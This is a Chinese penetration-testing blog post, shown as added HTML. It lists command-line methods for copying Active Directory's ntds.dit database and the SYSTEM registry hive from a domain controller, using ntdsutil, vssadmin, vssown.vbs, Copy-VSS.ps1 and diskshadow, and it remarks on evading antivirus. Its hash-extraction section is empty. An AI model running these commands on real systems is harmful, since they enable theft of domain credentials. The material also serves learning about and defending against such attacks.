@@ -1,0 +1,787 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Dota_128px_1143945_easyicon.net.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mamor5409.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="ntds.dit导出及解析">
+<meta property="og:url" content="http://mamor5409.github.io/posts/77c245ea/index.html">
+<meta property="og:site_name" content="Mamor&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://mamor5409.github.io/posts/77c245ea/ntdsutil_create_snapshot.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/77c245ea/ntdsutil_load_snapshot.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/77c245ea/copy_ntds.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/77c245ea/ntdsutil_delete_snapshot.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/77c245ea/ntdsutil_check_snapshot.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/77c245ea/vssadmin.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/77c245ea/vssown.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/77c245ea/ntdsutil_IFM.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/77c245ea/test_file.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/77c245ea/copy_vss.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/77c245ea/diskshadow_calc.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/77c245ea/diskshadow_2.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/77c245ea/reg_system.png">
+<meta property="article:published_time" content="2021-08-22T02:21:01.000Z">
+<meta property="article:modified_time" content="2021-08-22T15:10:12.864Z">
+<meta property="article:author" content="Mamor">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://mamor5409.github.io/posts/77c245ea/ntdsutil_create_snapshot.png">
+
+<link rel="canonical" href="http://mamor5409.github.io/posts/77c245ea/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ntds.dit导出及解析 | Mamor's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Mamor's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Mamor's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://mamor5409.github.io/posts/77c245ea/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kabi.jpg">
+      <meta itemprop="name" content="Mamor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mamor's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ntds.dit导出及解析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-08-22 10:21:01 / 修改时间：23:10:12" itemprop="dateCreated datePublished" datetime="2021-08-22T10:21:01+08:00">2021-08-22</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+            <div class="post-description"> </div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="提取ntds-dit"><a href="#提取ntds-dit" class="headerlink" title="提取ntds.dit"></a>提取ntds.dit</h3><h4 id="使用ntdsutil-工具提取"><a href="#使用ntdsutil-工具提取" class="headerlink" title="使用ntdsutil 工具提取"></a>使用ntdsutil 工具提取</h4><p>ntdsutil.exe是一个为活动目录提供管理机制的命令行工具。使用ntdsutil.exe可以维护和管理互动目录数据库、控制单个主机操作、创建应用程序目录分区、删除由未使用活动目录安装向导（DCPRome.exe）成功降级的域控制器留下的元数据等。该工具默认安装在域控制器上，可以在域控制器上直接操作，可以通过域内机器在域控制器上远程操作。</p>
+<p>ntdsutil.exe 支持的操作系统包括 Windows server 2003 ，Windows server 2008，Windows server 2012</p>
+<p> 使用方法如下</p>
+<h5 id="创建快照"><a href="#创建快照" class="headerlink" title="创建快照"></a>创建快照</h5><p>该快照包含windows中的所有文件，且在复制文件时不会受到windows锁定机制的限制</p>
+<p><code>ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</code></p>
+<p>{}内为快照的GUID</p>
+<p><img src="/posts/77c245ea/ntdsutil_create_snapshot.png"></p>
+<h5 id="挂载快照"><a href="#挂载快照" class="headerlink" title="挂载快照"></a>挂载快照</h5><p><code>ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit</code></p>
+<p><img src="/posts/77c245ea/ntdsutil_load_snapshot.png"></p>
+<h5 id="拷贝快照"><a href="#拷贝快照" class="headerlink" title="拷贝快照"></a>拷贝快照</h5><p>使用windows自带的copy命令将快照中的文件复制出来,将快照中的<code>C:\$SNAP_202107122344_VOLUMEC$\windows\ntds\ntds.dit</code>复制到本地计算机的 <code>C:\Users\Administrator\Desktop\</code> 桌面上</p>
+<p><code>copy C:\$SNAP_202107122344_VOLUMEC$\windows\ntds\ntds.dit C:\Users\Administrator\Desktop\ntds.dit</code></p>
+<p><img src="/posts/77c245ea/copy_ntds.png"></p>
+<h5 id="卸载并删除快照"><a href="#卸载并删除快照" class="headerlink" title="卸载并删除快照"></a>卸载并删除快照</h5><p><code>ntdsutil snapshot &quot;unmout &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</code></p>
+<p><img src="/posts/77c245ea/ntdsutil_delete_snapshot.png"></p>
+<h5 id="检查快照是否删除"><a href="#检查快照是否删除" class="headerlink" title="检查快照是否删除"></a>检查快照是否删除</h5><p><code>ntdsutil snapshot &quot;List All&quot; quit quit</code></p>
+<p><img src="/posts/77c245ea/ntdsutil_check_snapshot.png"></p>
+<br>
+
+<h4 id="利用vssadmin提取ntds-dit"><a href="#利用vssadmin提取ntds-dit" class="headerlink" title="利用vssadmin提取ntds.dit"></a>利用vssadmin提取ntds.dit</h4><p><code>vssadmin</code>是Windows上的一个卷影拷贝服务的命令行管理工具，可用于创建和删除卷影拷贝、列出卷影拷贝的信息，显示已安装的所有卷影拷贝写入程序和提供程序，以及改变卷影拷贝的存储空间的大小等。</p>
+<p>适用于   Windows 10，Windows 8.1，Windows Server 2016，Windows Server 2012 R2，Windows Server 2012，Windows Server 2008 R2，Windows Server 2008</p>
+<h5 id="创建一个C盘的卷影拷贝"><a href="#创建一个C盘的卷影拷贝" class="headerlink" title="创建一个C盘的卷影拷贝"></a>创建一个C盘的卷影拷贝</h5><p><code>vssadmin create shadow /for=c:</code></p>
+<h5 id="将创建的卷影拷贝中的ntds-dit-copy到桌面"><a href="#将创建的卷影拷贝中的ntds-dit-copy到桌面" class="headerlink" title="将创建的卷影拷贝中的ntds.dit copy到桌面"></a>将创建的卷影拷贝中的ntds.dit copy到桌面</h5><p><code>copy \\?\CLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit c:\User\Administrator\Desktop ntds.dit</code></p>
+<h5 id="删除创建的卷影拷贝"><a href="#删除创建的卷影拷贝" class="headerlink" title="删除创建的卷影拷贝"></a>删除创建的卷影拷贝</h5><p><code>vssadmin delete shadows /for=c:  /quiet</code></p>
+<p><img src="/posts/77c245ea/vssadmin.png"></p>
+<br>
+
+<h4 id="利用vssown-vbs-脚本提取nods-dit"><a href="#利用vssown-vbs-脚本提取nods-dit" class="headerlink" title="利用vssown.vbs 脚本提取nods.dit"></a>利用vssown.vbs 脚本提取nods.dit</h4><p>下载地址：<code>https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</code></p>
+<p>vssown.vbs功能与vssadmin类似，本质是通过wmi对shadowCopt进行操作，可用于创建和删除卷影拷贝，以及启动和停止卷影拷贝服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;启动卷影拷贝服务</span><br><span class="line">cscript vssown.vbs &#x2F;start</span><br><span class="line">&#x2F;&#x2F;创建一个C盘的卷影拷贝</span><br><span class="line">cscript vssown.vbs &#x2F;create c</span><br><span class="line">&#x2F;&#x2F;列出当前卷影拷贝</span><br><span class="line">cscript vssown.vbs &#x2F;list</span><br><span class="line">&#x2F;&#x2F;复制ntds.dit到桌面</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\NTDS\ntds.dit C:\Users\Administrator\Desktop\ntds.dit</span><br><span class="line">&#x2F;&#x2F;删除卷影拷贝</span><br><span class="line">cscript vssown.vbs &#x2F;delete &#123;GUID&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/77c245ea/vssown.png"></p>
+<h4 id="使用ntdsutil中的IFM获取ntds-dit"><a href="#使用ntdsutil中的IFM获取ntds-dit" class="headerlink" title="使用ntdsutil中的IFM获取ntds.dit"></a>使用ntdsutil中的IFM获取ntds.dit</h4><p>将ntds.dit复制到<code>C:\test\Active Directory\ </code>文件夹中</p>
+<p>使用管理员模式打开cmd输入如下</p>
+<p><code>ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full C:/test&quot; q  q</code></p>
+<p><img src="/posts/77c245ea/ntdsutil_IFM.png"></p>
+<p>然后访问c盘 可以看到创建了一个test目录  </p>
+<p>test目录下有俩个文件 分别为 <code>Active Directory</code>  和 <code>registry</code></p>
+<p><code>registry</code>下包含 <code>SYSTEM</code> 和 <code>SECURITY</code></p>
+<p><code>Active Directory</code>下包含 <code>ntds.dit</code></p>
+<p><img src="/posts/77c245ea/test_file.png"></p>
+<p>然后将以上内容复制到桌面</p>
+<p>这里选择使用<code>Copy-VSS.ps1</code></p>
+<p>下载地址：<code>https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1</code></p>
+<p>进入powershell </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Set-Executionpolicy bypass</span><br><span class="line">Import-Module .\Copy-VSS.ps1  &#x2F;&#x2F;导入脚本</span><br><span class="line">copy-vss    &#x2F;&#x2F;执行脚本</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/77c245ea/copy_vss.png"></p>
+<br>
+
+<h4 id="使用diskshadow导出ntds-dit"><a href="#使用diskshadow导出ntds-dit" class="headerlink" title="使用diskshadow导出ntds.dit"></a>使用diskshadow导出ntds.dit</h4><p><code>Diskshadow.exe</code>使用卷影拷贝服务（VSS）所提供的多个功能。默认配置下，Diskshadow.exe使用了一种交互式的命令解释器,这里跟DiskRaid或者DiskPart比较类似。因为diskshadow的代码是由微软签名的，而且<code>Windows Server2008、Windows Server2012、Windows Server2016都默认包含diskshadow</code>。所以，diskshadow也可以用来操作卷影拷贝服务并导出ntds.dit。diskshadow的功能与vshadow类似，且同样位于<code>C:\windows\system32\ </code>目录下.</p>
+<p>由于是微软官方的工具，所以不会被杀</p>
+<p>查看<code>diskshadow.exe</code> 的帮助信息</p>
+<p><code>diskshdow /?</code></p>
+<p>一般先在C盘写入需要执行的命令 存储为command.txt</p>
+<p><code>echo &quot;exec c:\windows\system32\calc.exe&quot;  &gt;command.txt</code></p>
+<p>但是这样生成的commod.txt会存在双引号 这样执行diskshadow命令的话 会无法正常执行，所以最好在执行diskshadow命令前先看下command.txt 是否正确</p>
+<p><code>type c:\command.txt</code></p>
+<p><code>diskshadow /s c:\command</code> </p>
+<p>然后会弹出之前写的calc</p>
+<p><img src="/posts/77c245ea/diskshadow_calc.png"></p>
+<p>使用<code>diskshadow.exe</code>导出<code>ntds.dit</code> 将命令写入文本文件中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;设置卷影拷贝</span><br><span class="line">set context persistent nowriters</span><br><span class="line">&#x2F;&#x2F;添加卷</span><br><span class="line">add volume c: alias someAlias</span><br><span class="line">&#x2F;&#x2F;创建快照</span><br><span class="line">create</span><br><span class="line">&#x2F;&#x2F;分配虚拟磁盘盘符</span><br><span class="line">expose %someAlias% k:</span><br><span class="line">&#x2F;&#x2F;将ntds.dit复制到C盘中</span><br><span class="line">exec &quot;cmd.exe&quot; &#x2F;c copy k:\Windows\NTDS\ntds.dit C:\Users\Administrator\Desktop\</span><br><span class="line">&#x2F;&#x2F;删除所有快照</span><br><span class="line">delete shadows all</span><br><span class="line">&#x2F;&#x2F;列出系统中的卷影拷贝</span><br><span class="line">list shadows all</span><br><span class="line">&#x2F;&#x2F;重置</span><br><span class="line">reset</span><br><span class="line">&#x2F;&#x2F;退出</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
+
+<p>然后使用<code>diskshadow.exe</code>加载这个文本文件</p>
+<p><code>diskshadow /s c:\2.txt</code></p>
+<p>在执行这条命令时 要在system32下执行，否则可能会报错</p>
+<p><img src="/posts/77c245ea/diskshadow_2.png"></p>
+<p>导出ntds.dit后，可以将system.hive转储。因为system.hive中存放着ntds.dit的密钥，如果没有该密钥，将无法查看ntds.dit中的信息</p>
+<p>可以使用Copy-VSS.ps1等方法导出SYSTEM文件，也可以执行如下命令，将导出system</p>
+<p><code>reg save hklm\system C:\Users\Administrator\Desktop\system.hive</code></p>
+<p><img src="/posts/77c245ea/reg_system.png"></p>
+<br>
+
+<br>
+
+<h3 id="导出ntds中的散列值"><a href="#导出ntds中的散列值" class="headerlink" title="导出ntds中的散列值"></a>导出ntds中的散列值</h3><br>
+
+<br>
+
+<br>
+
+<br>
+
+<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://pingmaoer.github.io/2020/07/03/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8/">https://pingmaoer.github.io/2020/07/03/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/251267.html">https://www.freebuf.com/articles/network/251267.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1731472">https://cloud.tencent.com/developer/article/1731472</a></p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+<div>
+
+  <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">------------- 💖 🌞 本 文 结 束 😚 感 谢 您 的 阅 读 🌞 💖 -------------</div>
+    
+</div>
+
+</div>
+
+<div>
+      
+        
+      
+</div>
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"></i><i class="fa fa-tag"></i> 内网渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/28d2faa0/" rel="prev" title="vulnhub-BLOGGER">
+      <i class="fa fa-chevron-left"></i> vulnhub-BLOGGER
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E5%8F%96ntds-dit"><span class="nav-number">1.</span> <span class="nav-text">提取ntds.dit</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8ntdsutil-%E5%B7%A5%E5%85%B7%E6%8F%90%E5%8F%96"><span class="nav-number">1.1.</span> <span class="nav-text">使用ntdsutil 工具提取</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E5%BF%AB%E7%85%A7"><span class="nav-number">1.1.1.</span> <span class="nav-text">创建快照</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8C%82%E8%BD%BD%E5%BF%AB%E7%85%A7"><span class="nav-number">1.1.2.</span> <span class="nav-text">挂载快照</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8B%B7%E8%B4%9D%E5%BF%AB%E7%85%A7"><span class="nav-number">1.1.3.</span> <span class="nav-text">拷贝快照</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8D%B8%E8%BD%BD%E5%B9%B6%E5%88%A0%E9%99%A4%E5%BF%AB%E7%85%A7"><span class="nav-number">1.1.4.</span> <span class="nav-text">卸载并删除快照</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E5%BF%AB%E7%85%A7%E6%98%AF%E5%90%A6%E5%88%A0%E9%99%A4"><span class="nav-number">1.1.5.</span> <span class="nav-text">检查快照是否删除</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8vssadmin%E6%8F%90%E5%8F%96ntds-dit"><span class="nav-number">1.2.</span> <span class="nav-text">利用vssadmin提取ntds.dit</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAC%E7%9B%98%E7%9A%84%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D"><span class="nav-number">1.2.1.</span> <span class="nav-text">创建一个C盘的卷影拷贝</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B0%86%E5%88%9B%E5%BB%BA%E7%9A%84%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D%E4%B8%AD%E7%9A%84ntds-dit-copy%E5%88%B0%E6%A1%8C%E9%9D%A2"><span class="nav-number">1.2.2.</span> <span class="nav-text">将创建的卷影拷贝中的ntds.dit copy到桌面</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A0%E9%99%A4%E5%88%9B%E5%BB%BA%E7%9A%84%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D"><span class="nav-number">1.2.3.</span> <span class="nav-text">删除创建的卷影拷贝</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8vssown-vbs-%E8%84%9A%E6%9C%AC%E6%8F%90%E5%8F%96nods-dit"><span class="nav-number">1.3.</span> <span class="nav-text">利用vssown.vbs 脚本提取nods.dit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8ntdsutil%E4%B8%AD%E7%9A%84IFM%E8%8E%B7%E5%8F%96ntds-dit"><span class="nav-number">1.4.</span> <span class="nav-text">使用ntdsutil中的IFM获取ntds.dit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8diskshadow%E5%AF%BC%E5%87%BAntds-dit"><span class="nav-number">1.5.</span> <span class="nav-text">使用diskshadow导出ntds.dit</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BC%E5%87%BAntds%E4%B8%AD%E7%9A%84%E6%95%A3%E5%88%97%E5%80%BC"><span class="nav-number">2.</span> <span class="nav-text">导出ntds中的散列值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference"><span class="nav-number">3.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Mamor"
+      src="/images/kabi.jpg">
+  <p class="site-author-name" itemprop="name">Mamor</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">78</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">33</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Mamor5409" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Mamor5409" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
